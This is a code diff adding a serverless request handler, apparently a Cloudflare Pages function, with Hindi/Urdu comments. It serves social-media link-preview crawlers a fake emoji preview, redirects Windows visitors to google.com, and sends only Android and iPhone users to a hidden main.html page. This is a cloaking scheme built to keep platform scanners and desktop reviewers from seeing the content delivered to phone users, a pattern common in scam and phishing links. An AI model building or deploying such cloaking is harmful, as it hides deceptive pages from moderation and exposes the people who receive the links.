@@ -1,0 +1,36 @@
+export async function onRequest(context) {
+  const userAgent = context.request.headers.get("user-agent") || "";
+  
+  // 1. Social media crawlers/bots ki pehchan
+  const isBot = /facebookexternalhit|WhatsApp|Twitterbot|TelegramBot|LinkedInBot|Discordbot/i.test(userAgent);
+
+  if (isBot) {
+    const ogHtml = `
+      <!DOCTYPE html>
+      <html>
+      <head>
+        <meta property="og:title" content="🩷❤️🩵🩷❤️" />
+        <meta property="og:description" content="Yahan Apni Description Likhein" />
+        <meta property="og:image" content="https://www.google.com/share.google?q=xC8bhL9JTNKUaBSbr" />
+        <meta property="og:type" content="website" />
+      </head>
+      <body></body>
+      </html>
+    `;
+    return new Response(ogHtml, {
+      headers: { "content-type": "text/html;charset=UTF-8" },
+    });
+  }
+
+  // 2. Agar Windows User hai, toh google.com par redirect karein
+  const isWindows = /Windows NT/i.test(userAgent);
+  
+  if (isWindows) {
+    return Response.redirect("https://google.com", 302);
+  }
+
+  // 3. Baqi sab (Android, iPhone, etc.) ko main.html dikhayein
+  const url = new URL(context.request.url);
+  url.pathname = "/main.html";
+  return Response.redirect(url.toString(), 302);
+}
